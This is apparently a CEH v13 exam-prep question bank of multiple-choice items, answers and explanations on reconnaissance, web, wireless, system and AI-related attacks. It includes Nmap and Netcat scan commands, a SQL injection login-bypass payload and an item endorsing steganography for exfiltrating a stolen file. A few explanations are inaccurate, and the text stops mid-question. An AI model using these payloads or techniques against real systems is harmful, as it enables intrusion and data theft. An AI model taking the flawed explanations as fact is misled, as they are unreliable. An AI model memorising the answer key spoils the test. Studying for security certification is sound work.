# CEH (Certified Ethical Hacker) v13 Comprehensive Question Bank

> Scraped from reputable sources across the internet. Questions simulate actual exam difficulty.
> Sources include: Pearson IT Certification, Matt Walker CEH guides, ExamTopics, CehTest.com, Pass4Success, EduSum, InfoSecTrain, and GitHub community repositories.

---

## EXAM INFO
- **Current Version:** CEH v13 (312-50v13), launched September 2024
- **Questions:** 125 multiple-choice
- **Duration:** 4 hours (240 minutes)
- **Passing Score:** 60-85% (scaled scoring)
- **Certification Validity:** 5 years

## EXAM DOMAIN WEIGHTS
| Domain | Weight |
|--------|--------|
| Reconnaissance (Footprinting & Scanning) | 21% |
| Wireless, Mobile, IoT, and Cloud | 18% |
| System Hacking | 17% |
| Web Application Hacking | 16% |
| Network and Perimeter Hacking | 14% |
| Cryptography and Social Engineering | 8% |
| Information Security Overview | 6% |

---

# SECTION 1: RECONNAISSANCE, FOOTPRINTING & SCANNING (21%)

## Q1
**Which Nmap switch best identifies the OS of servers in a DMZ?**
- A) nmap -P0
- B) nmap -sO
- C) nmap -sS
- D) nmap -O

**Answer:** D
**Explanation:** The -O flag activates OS detection. -P0 skips ping, -sO does IP protocol scan, -sS does a stealth SYN scan.
**Source:** Pearson IT Certification

---

## Q2
**Identifying the OS of a system by monitoring traffic on a switch describes which activity?**
- A) Vulnerability scanning
- B) Nmap port scanning
- C) Active OS fingerprinting
- D) Passive OS fingerprinting

**Answer:** D
**Explanation:** Passive OS fingerprinting analyzes network traffic without sending probes to the target. Active fingerprinting sends packets and examines responses.
**Source:** Pearson IT Certification

---

## Q3
**What are the correct ICMP types for a ping request and response?**
- A) Type 5 request, Type 3 response
- B) Type 8 request, Type 0 response
- C) Type 3 request, Type 5 response
- D) Type 0 request, Type 8 response

**Answer:** B
**Explanation:** ICMP Type 8 is Echo Request, Type 0 is Echo Reply.
**Source:** Pearson IT Certification

---

## Q4
**Which vulnerability affected Bash in 2014?**
- A) Shellshock
- B) Heartbleed
- C) Bashshell
- D) Poodle

**Answer:** A
**Explanation:** Shellshock (CVE-2014-6271) was a critical vulnerability in the Bash shell that allowed arbitrary command execution.
**Source:** Pearson IT Certification

---

## Q5
**Running "nmap -sX -vv -P0 192.168.1.123 -p 80" against an open port returns what?**
- A) RST
- B) No response
- C) SYN ACK
- D) ACK

**Answer:** B
**Explanation:** An XMAS scan (-sX) against an open port returns no response. A closed port would return RST.
**Source:** Pearson IT Certification

---

## Q6
**Which Netcat command performs a UDP scan of ports 1-1024?**
- A) Nc -sS -O target 1-1024
- B) Nc -hU <host(s)>
- C) Nc -sU -p 1-1024 <host(s)>
- D) Nc -u -v -w2 <host> 1-1024

**Answer:** D
**Explanation:** The -u flag specifies UDP, -v is verbose, -w2 sets a 2-second timeout.
**Source:** Pearson IT Certification

---

## Q7
**What does "nmap -sL www.example.com" accomplish?**
- A) System was offline
- B) Technique checks DNS only, no scanning occurs
- C) Syntax is incorrect
- D) ICMP is blocked

**Answer:** B
**Explanation:** The -sL flag performs a list scan, which only resolves DNS names without sending any packets to the target.
**Source:** Pearson IT Certification

---

## Q8
**With a 20-byte IP header and 84-byte datagram length, which OS is likely?**
- A) Windows XP
- B) Linux
- C) Windows 7
- D) Windows 8

**Answer:** B
**Explanation:** Linux systems typically use a 64-byte payload for ICMP, resulting in 84-byte total datagram (20 IP header + 8 ICMP header + 56 data = 84). Windows uses different sizes.
**Source:** Pearson IT Certification

---

## Q9
**Given 192.168.1.24 and 192.168.1.35 with subnet mask 255.255.255.224, which statement is true?**
- A) They are on the same network
- B) Both have default gateway 192.168.1.63
- C) Both have default gateway 192.168.1.254
- D) They are on separate subnets

**Answer:** D
**Explanation:** A /27 mask creates subnets of 32 addresses. 192.168.1.24 is in the 192.168.1.0/27 subnet, while 192.168.1.35 is in the 192.168.1.32/27 subnet.
**Source:** Pearson IT Certification

---

## Q10
**Which scan type is harder to perform due to lack of responses from open services?**
- A) Stealth scanning
- B) ACK scanning
- C) UDP scanning
- D) FIN scan

**Answer:** C
**Explanation:** UDP scanning is difficult because open UDP ports don't send responses, making it hard to distinguish open from filtered ports.
**Source:** Pearson IT Certification

---

## Q11
**What is the correct Nmap syntax to extract an SSH host key using scripting?**
- A) nmap -sC -p21, 111, 139 -T3 www.target.com
- B) nmap -sC -p22, 111, 139 -T4 www.target.com
- C) nmap -sL -p21, 111, 139 -T3 www.target.com
- D) nmap -sI -p22, 111, 139 -T4 www.target.com

**Answer:** B
**Explanation:** SSH runs on port 22, -sC enables default scripts, and -T4 sets aggressive timing.
**Source:** Pearson IT Certification

---

## Q12
**An ACK scan shows ICMP type 3 code 13. What does this indicate?**
- A) The firewall is the only router with an ACL
- B) The port is open
- C) Port knocking is being used
- D) The port is closed

**Answer:** A
**Explanation:** ICMP Type 3 Code 13 means "Communication Administratively Prohibited" — indicating a firewall with an access control list is filtering traffic.
**Source:** Pearson IT Certification

---

## Q13
**For a Brazilian .com site Whois lookup, which RIR should be queried?**
- A) AfriNIC
- B) ARIN
- C) APNIC
- D) RIPE

**Answer:** B
**Explanation:** ARIN (American Registry for Internet Numbers) covers North and South America, including Brazil.
**Source:** Pearson IT Certification

---

## Q14
**A Wireshark capture shows FIN, PSH, and URG flags set. Which scan type is this?**
- A) SYN
- B) IPID
- C) NULL
- D) XMAS

**Answer:** D
**Explanation:** An XMAS scan sets the FIN, PSH, and URG flags, making the packet "lit up like a Christmas tree."
**Source:** Pearson IT Certification

---

## Q15
**What does "Nmap -sn 192.168.123.1-254" do?**
- A) Ping only targets, no port scan
- B) NULL TCP scan
- C) TCP port scan
- D) Port scan all targets

**Answer:** A
**Explanation:** The -sn flag performs a ping sweep (host discovery only) without port scanning.
**Source:** Pearson IT Certification

---

## Q16
**Which command scans ALL ports on 192.168.123.1?**
- A) nmap -p 1,65536 192.168.123.1
- B) nmap -p- 192.168.123.1
- C) nmap 192.168.123.1 -ports "all"
- D) nmap -p 0-65536 192.168.123.1

**Answer:** B
**Explanation:** The -p- shorthand tells Nmap to scan all 65535 ports.
**Source:** Pearson IT Certification

---

## Q17
**Which technique maps firewall rules on routers?**
- A) NULL scan
- B) ACK scan
- C) Inverse flag scan
- D) Firewalk

**Answer:** D
**Explanation:** Firewalk is a tool that uses TTL-based techniques to determine which ports a firewall allows through.
**Source:** Pearson IT Certification

---

## Q18
**After identifying port 80 is open, what should be the next step?**
- A) Examine the webpage source code
- B) Use FTP to connect to port 80
- C) Telnet to the open port and grab the banner
- D) Attempt to connect to port 443

**Answer:** C
**Explanation:** Banner grabbing via telnet is the standard next step in enumeration to identify the service, version, and potential vulnerabilities.
**Source:** Pearson IT Certification

---

## Q19
**Where should an ethical hacker start the information-gathering process?**
- A) Interviewing the company
- B) Dumpster diving
- C) The company's website
- D) Interviewing employees

**Answer:** C
**Explanation:** The company's website is the natural starting point for passive reconnaissance, providing organizational structure, contact info, and technology details.
**Source:** Pearson IT Certification

---

## Q20
**What does the Nmap -sT switch do?**
- A) UDP scan
- B) ICMP scan
- C) TCP full connect scan
- D) TCP ACK scan

**Answer:** C
**Explanation:** The -sT flag performs a full TCP connect scan, completing the three-way handshake.
**Source:** Pearson IT Certification

---

## Q21
**Which would be considered OUTSIDE the scope of footprinting?**
- A) Finding physical addresses
- B) Attacking targets
- C) Identifying potential targets
- D) Reviewing a company website

**Answer:** B
**Explanation:** Footprinting is purely information gathering. Attacking targets occurs in a later phase.
**Source:** Pearson IT Certification

---

## Q22
**During a security assessment, which tool might determine a network range?**
- A) ARIN
- B) DIG
- C) Traceroute
- D) Ping host

**Answer:** A
**Explanation:** ARIN (American Registry for Internet Numbers) maintains records of IP address allocations and network ranges.
**Source:** Pearson IT Certification

---

## Q23
**The "intitle:" string is used for what activity?**
- A) Traceroute
- B) Google search (Google dorking)
- C) Website query
- D) Host scanning

**Answer:** B
**Explanation:** "intitle:" is a Google search operator used in Google dorking to find pages with specific words in the title.
**Source:** Pearson IT Certification

---

## Q24
**Which TCP scan type is known as the half-open scan?**
- A) FIN scan
- B) XMAS scan
- C) SYN scan
- D) Null scan

**Answer:** C
**Explanation:** A SYN scan sends SYN, receives SYN-ACK, then sends RST instead of completing the handshake — hence "half-open."
**Source:** Pearson IT Certification

---

## Q25
**What scan is also known as a zombie scan?**
- A) IDLE scan
- B) SYN scan
- C) FIN scan
- D) Stealth scan

**Answer:** A
**Explanation:** An IDLE scan uses a "zombie" host's predictable IPID sequence to scan ports without revealing the attacker's IP.
**Source:** Pearson IT Certification

---

## Q26
**What TCP port scan toggles on FIN, URG, and PSH flags?**
- A) XMAS scan
- B) Null scan
- C) ACK scan
- D) None of these

**Answer:** A
**Explanation:** The XMAS scan sets FIN, URG, and PSH flags simultaneously.
**Source:** Pearson IT Certification

---

## Q27
**Which tools can enumerate systems running NetBIOS?**
- A) Nmap
- B) nbtscan
- C) Metasploit
- D) All of the above

**Answer:** D
**Explanation:** All three tools can enumerate NetBIOS services on target systems.
**Source:** Pearson IT Certification

---

## Q28
**What information can be obtained from enumerating insecure SNMP systems?**
- A) Network interface configuration
- B) Device hostname and current time
- C) Device IP routing table
- D) All of the above

**Answer:** D
**Explanation:** SNMP, especially with default community strings, can reveal extensive system information including interfaces, hostnames, and routing tables.
**Source:** Pearson IT Certification

---

## Q29
**What SMTP command verifies whether a user's email mailbox exists?**
- A) EXPN
- B) VRFY
- C) RCPT
- D) None of the above

**Answer:** B
**Explanation:** VRFY (Verify) checks if a specific mailbox exists on the mail server.
**Source:** Pearson IT Certification

---

## Q30
**Which of the following tools is commonly used to perform DNS footprinting in the reconnaissance phase?**
- A) Nmap
- B) Metasploit
- C) Nslookup
- D) John the Ripper

**Answer:** C
**Explanation:** Nslookup is specifically designed for querying DNS records. Nmap is a port scanner, Metasploit is an exploitation framework, John the Ripper is a password cracker.
**Source:** CehTest.com

---

# SECTION 2: WEB APPLICATION HACKING (16%)

## Q31
**What type of scan sends a SYN packet and waits for a SYN-ACK or RST response to determine port status?**
- A) SYN scan
- B) TCP connect scan
- C) ACK scan
- D) Xmas scan

**Answer:** A
**Explanation:** A SYN scan sends SYN and analyzes the response — SYN-ACK means open, RST means closed.
**Source:** CehTest.com

---

## Q32
**Which type of SQL injection relies on the server's response time to infer information?**
- A) Union-based SQL injection
- B) Error-based SQL injection
- C) Blind time-based SQL injection
- D) Out-of-band SQL injection

**Answer:** C
**Explanation:** Time-based blind SQL injection uses conditional time delays (e.g., WAITFOR DELAY, SLEEP()) to infer true/false conditions when no visible output is returned.
**Source:** ExamTopics

---

## Q33
**An attacker inserts the following into a web form: `' OR '1'='1' --`. What attack is being performed?**
- A) Cross-site scripting
- B) SQL injection
- C) Command injection
- D) LDAP injection

**Answer:** B
**Explanation:** This is a classic SQL injection payload that always evaluates to TRUE, bypassing authentication checks.
**Source:** Multiple CEH Study Guides

---

## Q34
**Which of the following is the BEST countermeasure against SQL injection?**
- A) Input validation and parameterized queries
- B) Using HTTPS
- C) Installing a firewall
- D) Disabling JavaScript

**Answer:** A
**Explanation:** Parameterized queries (prepared statements) prevent SQL injection by separating code from data. Input validation adds defense in depth.
**Source:** OWASP/CEH Study Guide

---

## Q35
**An attacker injects a malicious script into a forum post that executes when other users view it. What attack is this?**
- A) Reflected XSS
- B) Stored XSS
- C) DOM-based XSS
- D) CSRF

**Answer:** B
**Explanation:** Stored (persistent) XSS stores the malicious script on the server (e.g., in a database), executing it whenever users view the affected page.
**Source:** CEH Study Guide

---

## Q36
**What does CSRF (Cross-Site Request Forgery) exploit?**
- A) Vulnerabilities in the web server
- B) Trust that a site has in the user's browser
- C) Weak encryption algorithms
- D) SQL injection vulnerabilities

**Answer:** B
**Explanation:** CSRF exploits the trust a website has in the user's authenticated browser session by forging requests on behalf of the victim.
**Source:** CEH Study Guide

---

# SECTION 3: SYSTEM HACKING (17%)

## Q37
**Which of the following is an example of privilege escalation?**
- A) Logging in as a user with default credentials
- B) Gaining root access after exploiting a vulnerability in a local system
- C) Using social engineering to gather user credentials
- D) Identifying open ports on a target system

**Answer:** B
**Explanation:** Privilege escalation is the act of exploiting a vulnerability to gain elevated access (e.g., root/admin) from a lower-privileged account.
**Source:** CehTest.com

---

## Q38
**A penetration tester needs to crack password hashes quickly. Which attack uses precomputed hash tables?**
- A) Dictionary attack
- B) Brute force attack
- C) Rainbow table attack
- D) Hybrid attack

**Answer:** C
**Explanation:** Rainbow tables contain precomputed hash-plaintext pairs, enabling rapid password recovery by looking up hash values instead of computing them.
**Source:** CEH Study Guide

---

## Q39
**What is the primary defense against rainbow table attacks?**
- A) Longer passwords
- B) Salting passwords before hashing
- C) Using symmetric encryption
- D) Two-factor authentication

**Answer:** B
**Explanation:** Salting adds random data to each password before hashing, making precomputed rainbow tables useless since each hash is unique.
**Source:** CEH Study Guide

---

## Q40
**An attacker wants to hide a malicious file inside a JPEG image. What technique is being used?**
- A) Encryption
- B) Steganography
- C) Obfuscation
- D) Tunneling

**Answer:** B
**Explanation:** Steganography hides data within other files (images, audio, video) without visibly altering them.
**Source:** CEH Study Guide

---

## Q41
**Which Windows feature can be used to hide data streams within NTFS files?**
- A) Shadow Copy
- B) Alternate Data Streams (ADS)
- C) BitLocker
- D) EFS

**Answer:** B
**Explanation:** NTFS Alternate Data Streams allow hiding data within legitimate files. Moving the file to a FAT partition removes ADS.
**Source:** CEH Study Guide

---

## Q42
**You are trying to steal Sales.xls from your company and transfer it to your home computer. The company filters and monitors outbound traffic. How would you achieve this without raising suspicion?**
- A) Encrypt the Sales.xls using PGP and email it to your personal gmail account
- B) Package the Sales.xls using Trojan wrappers and telnet them to your home computer
- C) Conceal the Sales.xls inside photo.jpg using steganography and send it in an innocent-looking email
- D) Change the extension to sales.txt and upload as an attachment to your hotmail account

**Answer:** C
**Explanation:** Steganography conceals data within innocent-looking files, making it the stealthiest method to bypass content filtering.
**Source:** Pass4Success

---

## Q43
**Which of the following tools can be used to perform a DNS zone transfer?**
- A) NSLookup
- B) Finger
- C) Dig
- D) Sam Spade
- E) Host
- F) Netcat
- G) Neotrace

**Answer:** A, C, D, E
**Explanation:** NSLookup, Dig, Sam Spade, and Host all support DNS zone transfer operations. Finger, Netcat, and Neotrace do not.
**Source:** Pass4Success

---

## Q44
**The network team has well-established firewall change procedures including manager approval. You notice a recently implemented rule without manager approval. What should be done?**
- A) Have the network team document why the rule was implemented without approval
- B) Monitor all traffic using the firewall rule until a manager can approve it
- C) Do not roll back the rule as the business may depend on it, but get approval ASAP
- D) Immediately roll back the firewall rule until a manager can approve it

**Answer:** D
**Explanation:** Unauthorized changes should be immediately rolled back. Proper change management requires approval before implementation.
**Source:** Pass4Success

---

## Q45
**Tess King uses nslookup to list all DNS information (Name Servers, MX records, CNAME records, etc.) for a domain. What is she attempting?**
- A) A zone harvesting
- B) A zone transfer
- C) A zone update
- D) A zone estimate

**Answer:** B
**Explanation:** A zone transfer replicates the entire DNS zone file, revealing all DNS records for the domain.
**Source:** Pass4Success

---

## Q46
**Risk assessment shows breach risk decreased from 50% to 10% after implementing controls. Risk threshold is 20%. What risk decision is best?**
- A) Accept the risk
- B) Introduce more controls to bring risk to 0%
- C) Mitigate the risk
- D) Avoid the risk

**Answer:** A
**Explanation:** Since risk (10%) is below the threshold (20%), accepting residual risk is the most cost-effective decision while maintaining acceptable security levels.
**Source:** Pass4Success

---

# SECTION 4: MALWARE THREATS

## Q47
**Which type of malware disguises itself as legitimate software to trick users into downloading it?**
- A) Virus
- B) Worm
- C) Trojan
- D) Spyware

**Answer:** C
**Explanation:** A Trojan disguises itself as legitimate software. Unlike viruses, Trojans don't self-replicate; unlike worms, they require user interaction to execute.
**Source:** CehTest.com

---

## Q48
**What distinguishes a worm from a virus?**
- A) Worms require user interaction to spread
- B) Worms can self-replicate across networks without user interaction
- C) Worms only affect mobile devices
- D) Worms encrypt files for ransom

**Answer:** B
**Explanation:** Worms self-propagate across networks without user interaction, while viruses require a host file and typically need user action to spread.
**Source:** CEH Study Guide

---

## Q49
**An organization notices unusual outbound traffic to an unknown IP at regular intervals. What type of malware is MOST likely responsible?**
- A) Ransomware
- B) Adware
- C) Botnet/Command-and-Control beacon
- D) Rootkit

**Answer:** C
**Explanation:** Regular beaconing to an external IP is characteristic of botnet C2 (command and control) communication.
**Source:** CEH Study Guide

---

# SECTION 5: WIRELESS, MOBILE, IoT & CLOUD (18%)

## Q50
**In WEP cracking, what is the purpose of sending deauthentication packets?**
- A) Gain access to the WEP code from deauth response packets
- B) Generate lots of network traffic for capturing IVs
- C) Determine the BSSID of the access point
- D) Discover the cloaked SSID

**Answer:** B
**Explanation:** Deauthentication forces client reconnections, generating traffic needed to capture ~15,000 IVs required for WEP cracking.
**Source:** Matt Walker CEH Guide

---

## Q51
**Which wireless standard operates at 54Mbps on 2.4GHz?**
- A) 802.11a
- B) 802.11b
- C) 802.11g
- D) 802.11n

**Answer:** C
**Explanation:** 802.11g combines advantages of a and b, operating at 54Mbps on 2.4GHz with backward compatibility.
**Source:** Matt Walker CEH Guide

---

## Q52
**What is needed to perform a fake authentication to a WEP access point? (Choose all that apply)**
- A) A captured authentication packet
- B) The IP address of the AP
- C) The MAC address of the AP
- D) The SSID

**Answer:** C, D
**Explanation:** Fake authentication requires the AP's MAC address (BSSID) and the SSID to craft valid connection attempts.
**Source:** Matt Walker CEH Guide

---

## Q53
**Which wireless tool is a true passive discovery tool?**
- A) Aircrack
- B) Kismet
- C) NetStumbler
- D) Netsniff

**Answer:** B
**Explanation:** Kismet operates passively with no packet injection, using channel hopping to discover networks without alerting IDS systems.
**Source:** Matt Walker CEH Guide

---

## Q54
**You discovered an AP using WEP. Which tool is best for cracking the network key?**
- A) NetStumbler
- B) Aircrack
- C) John the Ripper
- D) Kismet

**Answer:** B
**Explanation:** Aircrack-ng is specifically designed for cracking WEP (and WPA) encryption keys from captured packet data.
**Source:** Matt Walker CEH Guide

---

## Q55
**Which statements are true about TKIP? (Choose all that apply)**
- A) TKIP forces a key change every 10,000 packets
- B) TKIP ensures keys do not change during a session
- C) TKIP is an integral part of WEP
- D) TKIP is an integral part of WPA

**Answer:** A, D
**Explanation:** TKIP rotates keys every ~10,000 packets and is the core encryption protocol of WPA, replacing WEP's static key approach.
**Source:** Matt Walker CEH Guide

---

## Q56
**Which statements about SSIDs are true? (Choose all that apply)**
- A) SSIDs are always 32 characters in length
- B) SSIDs can be up to 32 characters in length
- C) Turning off broadcasting prevents discovery of the SSID
- D) SSIDs are part of every packet header from the AP
- E) SSIDs provide important security
- F) Multiple SSIDs are needed to move between APs in an ESS

**Answer:** B, D
**Explanation:** SSIDs can be up to 32 characters and are included in every packet header, making broadcast disabling ineffective as a security measure.
**Source:** Matt Walker CEH Guide

---

## Q57
**Which statements about WEP Initialization Vectors are true? (Choose all that apply)**
- A) IVs are 32 bits in length
- B) IVs are 24 bits in length
- C) IVs get reused frequently
- D) IVs are sent in clear text
- E) IVs are encrypted during transmission
- F) IVs are used once per session

**Answer:** B, C, D
**Explanation:** WEP IVs are 24 bits, sent unencrypted, and reused frequently — these weaknesses enable relatively quick key recovery.
**Source:** Matt Walker CEH Guide

---

## Q58
**A pen tester sets up a rogue AP with the same SSID as the target. Which tools can detect it? (Choose all that apply)**
- A) NetStumbler
- B) NetSurveyor
- C) Kismet
- D) Aircrack
- E) ToneLoc

**Answer:** A, B, C
**Explanation:** NetStumbler, NetSurveyor, and Kismet are wireless network discovery tools capable of identifying unauthorized access points.
**Source:** Matt Walker CEH Guide

---

## Q59
**A pen tester runs the airsnarf tool from a Linux laptop. What is she attempting?**
- A) MAC flooding against an AP
- B) Denial-of-service attacks against APs
- C) Cracking WEP encryption
- D) Stealing usernames and passwords from an AP

**Answer:** D
**Explanation:** Airsnarf creates a rogue AP that steals credentials from public hotspot users through DNS and HTTP redirects.
**Source:** Matt Walker CEH Guide

---

## Q60
**What frequency does Bluetooth operate in?**
- A) 2.4–2.48GHz
- B) 2.5GHz
- C) 2.5–5GHz
- D) 5GHz

**Answer:** A
**Explanation:** Bluetooth operates in the 2.4–2.48GHz ISM band using frequency-hopping spread spectrum.
**Source:** Matt Walker CEH Guide

---

## Q61
**The service area provided by multiple APs in the same network is known as what?**
- A) ESS (single AP service area)
- B) BSSID
- C) ESS (Extended Service Set)
- D) ESSID

**Answer:** C
**Explanation:** An ESS (Extended Service Set) is created when multiple APs share the same SSID for seamless roaming.
**Source:** Matt Walker CEH Guide

---

## Q62
**A pen tester boosts laptop signal and drives building to building searching for wireless APs. What attack is this?**
- A) War chalking
- B) War walking
- C) War driving
- D) War moving

**Answer:** C
**Explanation:** War driving involves driving around with enhanced wireless reception equipment to identify available networks.
**Source:** Matt Walker CEH Guide

---

## Q63
**Omnidirectional antennas are in the building corners. Which statements are true? (Choose all)**
- A) The site may be vulnerable to sniffing from outside
- B) The site is not vulnerable to sniffing from outside
- C) Dipole antennas may improve security
- D) Directional antennas may improve security

**Answer:** A, D
**Explanation:** Omnidirectional antennas in corners broadcast outside the building. Directional antennas would concentrate signal inward.
**Source:** Matt Walker CEH Guide

---

## Q64
**Which is a true statement regarding wireless security?**
- A) WPA2 is better than WEP
- B) WEP is better than WPA2
- C) Cloaking SSID and MAC filtering eliminates need for encryption
- D) Increasing SSID length increases security

**Answer:** A
**Explanation:** WPA2 uses AES encryption and TKIP key rotation, making it far superior to WEP's vulnerable RC4 implementation.
**Source:** Matt Walker CEH Guide

---

## Q65
**A colleague modifies his MAC address on his wireless adapter. Why most likely?**
- A) Port security is enabled on the AP
- B) The SSID is cloaked
- C) MAC filtering is enabled on the AP
- D) Weak signaling

**Answer:** C
**Explanation:** MAC address spoofing is used to bypass MAC address filtering on access points.
**Source:** Matt Walker CEH Guide

---

## Q66
**A phone becomes unresponsive, is rebooted, and then disconnects again during the next call. Which Bluetooth attack is this?**
- A) Bluesmacking
- B) Bluejacking
- C) Bluesniffing
- D) Bluesnarfing

**Answer:** A
**Explanation:** Bluesmacking is a Bluetooth denial-of-service attack that causes device unresponsiveness and disconnections.
**Source:** Matt Walker CEH Guide

---

## Q67
**Which wireless standard uses MIMO antenna technology for high data rates?**
- A) 802.11b
- B) 802.11g
- C) 802.11n
- D) 802.16

**Answer:** C
**Explanation:** 802.11n achieves speeds over 100Mbps using MIMO (Multiple Input, Multiple Output) antenna arrays.
**Source:** Matt Walker CEH Guide

---

## Q68
**A DevOps engineer transitions to Docker containers. Each image is cryptographically signed. What does this provide?**
- A) Performance optimization
- B) Network isolation
- C) Proof of origin and integrity
- D) Automatic scaling

**Answer:** C
**Explanation:** Docker Content Trust uses cryptographic signatures to verify image origin and integrity, preventing tampered or unauthorized images.
**Source:** ExamTopics CEH v13

---

## Q69
**An attacker discovers an AWS S3 bucket with public read access. What is this vulnerability called?**
- A) Server-side request forgery
- B) Cloud misconfiguration
- C) Container escape
- D) API key exposure

**Answer:** B
**Explanation:** Publicly accessible S3 buckets are a classic cloud misconfiguration vulnerability that can expose sensitive data.
**Source:** CEH v13 Study Guide

---

## Q70
**Which IoT protocol operates on port 1883 and is commonly targeted in IoT attacks?**
- A) CoAP
- B) MQTT
- C) Zigbee
- D) Z-Wave

**Answer:** B
**Explanation:** MQTT (Message Queuing Telemetry Transport) runs on port 1883 (or 8883 for TLS) and is widely used in IoT but often deployed without authentication.
**Source:** CEH v13 Study Guide

---

# SECTION 6: CRYPTOGRAPHY & SOCIAL ENGINEERING (8%)

## Q71
**What type of cryptographic attack involves trying all possible keys?**
- A) Dictionary attack
- B) Birthday attack
- C) Brute force attack
- D) Side-channel attack

**Answer:** C
**Explanation:** A brute force attack systematically tries every possible key combination until finding the correct one.
**Source:** CehTest.com

---

## Q72
**Which encryption algorithm is considered symmetric?**
- A) RSA
- B) AES
- C) Diffie-Hellman
- D) ECC

**Answer:** B
**Explanation:** AES (Advanced Encryption Standard) uses the same key for encryption and decryption. RSA, DH, and ECC are asymmetric.
**Source:** CEH Study Guide

---

## Q73
**What is the primary purpose of a digital signature?**
- A) Encrypt the message
- B) Verify the sender's identity and message integrity
- C) Compress the data
- D) Create a VPN tunnel

**Answer:** B
**Explanation:** Digital signatures provide authentication (verifying the sender) and integrity (ensuring the message wasn't altered).
**Source:** CEH Study Guide

---

## Q74
**An attacker intercepts communication between two parties and relays modified messages. What attack is this?**
- A) Replay attack
- B) Man-in-the-middle attack
- C) Session hijacking
- D) DNS poisoning

**Answer:** B
**Explanation:** A man-in-the-middle (MITM) attack intercepts and potentially alters communications between two parties who believe they are communicating directly.
**Source:** CEH Study Guide

---

## Q75
**Which hashing algorithm produces a 160-bit digest?**
- A) MD5
- B) SHA-1
- C) SHA-256
- D) SHA-512

**Answer:** B
**Explanation:** SHA-1 produces a 160-bit (20-byte) hash digest. MD5 produces 128-bit, SHA-256 produces 256-bit.
**Source:** CEH Study Guide

---

## Q76
**What social engineering technique involves following an authorized person through a secure door?**
- A) Phishing
- B) Pretexting
- C) Tailgating
- D) Baiting

**Answer:** C
**Explanation:** Tailgating (or piggybacking) involves following an authorized person through a physical access control without proper credentials.
**Source:** CEH Study Guide

---

## Q77
**An attacker sends emails pretending to be from the victim's bank. What attack is this?**
- A) Spear phishing
- B) Phishing
- C) Whaling
- D) Vishing

**Answer:** B
**Explanation:** Phishing uses fraudulent emails impersonating trusted entities to steal credentials. Spear phishing targets specific individuals, whaling targets executives.
**Source:** CEH Study Guide

---

# SECTION 7: NETWORK & PERIMETER HACKING (14%)

## Q78
**Which technique allows an attacker to redirect traffic on a switched network by corrupting ARP caches?**
- A) DNS poisoning
- B) ARP poisoning/spoofing
- C) MAC flooding
- D) VLAN hopping

**Answer:** B
**Explanation:** ARP poisoning sends fake ARP replies to associate the attacker's MAC with a legitimate IP, redirecting traffic through the attacker's machine.
**Source:** CEH Study Guide

---

## Q79
**The key to session hijacking is determining what?**
- A) The victim's MAC address
- B) The initial sequence number (ISN)
- C) The victim's IP address
- D) The session cookie name

**Answer:** B
**Explanation:** TCP session hijacking requires predicting or capturing the initial sequence number to inject packets that appear legitimate.
**Source:** CEH Study Guide

---

## Q80
**An attacker injects packets into a session without seeing responses. What type of hijacking is this?**
- A) Active session hijacking
- B) Blind hijacking
- C) Passive session hijacking
- D) Cross-site session hijacking

**Answer:** B
**Explanation:** Blind hijacking occurs when the attacker injects commands into a session without receiving responses, relying on sequence number prediction.
**Source:** CEH Study Guide

---

## Q81
**Which DDoS attack exploits the three-way handshake?**
- A) Smurf attack
- B) SYN flood
- C) Ping of death
- D) Teardrop attack

**Answer:** B
**Explanation:** SYN flood sends massive SYN requests without completing the handshake, exhausting server resources with half-open connections.
**Source:** CEH Study Guide

---

## Q82
**Which IDS evasion technique involves splitting an attack across multiple small packets?**
- A) Encryption
- B) Fragmentation
- C) Polymorphism
- D) Tunneling

**Answer:** B
**Explanation:** Fragmentation splits malicious payloads across multiple packets, hoping the IDS won't reassemble them for inspection.
**Source:** CEH Study Guide

---

## Q83
**What is the purpose of a honeypot?**
- A) To encrypt network traffic
- B) To attract and study attackers
- C) To filter spam
- D) To balance network load

**Answer:** B
**Explanation:** Honeypots are decoy systems designed to attract attackers, allowing security teams to study attack methods and divert threats from production systems.
**Source:** CEH Study Guide

---

# SECTION 8: CEH v13 AI & MODERN TOPICS

## Q84
**In CEH v13, which AI technique is used to generate realistic fake images/videos for social engineering?**
- A) Reinforcement Learning
- B) Generative Adversarial Networks (GANs)
- C) Natural Language Processing
- D) Support Vector Machines

**Answer:** B
**Explanation:** GANs (Generative Adversarial Networks) create realistic deepfake images and videos used in advanced social engineering attacks.
**Source:** CEH v13 Curriculum / InfoSecTrain

---

## Q85
**What does the OWASP Top 10 for AI specifically address?**
- A) Web application vulnerabilities
- B) Common vulnerabilities in AI-based software
- C) Network protocol weaknesses
- D) Mobile app security flaws

**Answer:** B
**Explanation:** CEH v13 integrates the OWASP Top 10 for AI, covering vulnerabilities like data poisoning, insecure APIs, and model theft in AI systems.
**Source:** CEH v13 Curriculum

---

## Q86
**An attacker manipulates training data to make an AI model produce incorrect results. What is this attack called?**
- A) Model extraction
- B) Data poisoning
- C) Adversarial examples
- D) Prompt injection

**Answer:** B
**Explanation:** Data poisoning corrupts the training dataset to compromise the model's accuracy and create backdoors or biases.
**Source:** CEH v13 Curriculum

---

## Q87
**Which module in CEH v13 covers AI-driven social engineering techniques like ChatGPT-crafted phishing emails?**
- A) Module 2: Footprinting
- B) Module 7: Malware Threats
- C) Module 9: Social Engineering
- D) Module 20: Cryptography

**Answer:** C
**Explanation:** Module 9 covers social engineering including AI-driven techniques: ChatGPT phishing emails, deepfake video creation, and voice cloning.
**Source:** InfoSecTrain / CEH v13 Curriculum

---

## Q88
**A security analyst discovers that an AI-powered security tool has started ignoring certain malicious patterns. What type of attack might have occurred?**
- A) Denial of service
- B) Adversarial machine learning attack
- C) Zero-day exploit
- D) Brute force attack

**Answer:** B
**Explanation:** Adversarial ML attacks manipulate AI/ML models by providing crafted inputs that cause them to misclassify or ignore malicious patterns.
**Source:** CEH v13 Study Guide

---

## Q89
**In a zero-trust architecture, what is the core principle?**
- A) Trust internal network traffic
- B) Never trust, always verify
- C) Trust but verify periodically
- D) Trust verified users indefinitely

**Answer:** B
**Explanation:** Zero trust eliminates implicit trust, requiring continuous verification of every user, device, and connection regardless of network location.
**Source:** CEH v13 Study Guide

---

## Q90
**Which type of attack compromises a software vendor's update mechanism to distribute malware to end users?**
- A) Watering hole attack
- B) Supply chain attack
- C) Drive-by download
- D) Spear phishing

**Answer:** B
**Explanation:** Supply chain attacks compromise the software development/distribution pipeline, affecting all downstream users (e.g., SolarWinds).
**Source:** CEH v13 Study Guide

---

## Q91
**An attacker gains initial access, establishes persistence, moves laterally through the network over weeks, and slowly exfiltrates data. What is this?**
- A) Script kiddie attack
- B) Distributed denial of service
- C) Advanced Persistent Threat (APT)
- D) Ransomware attack

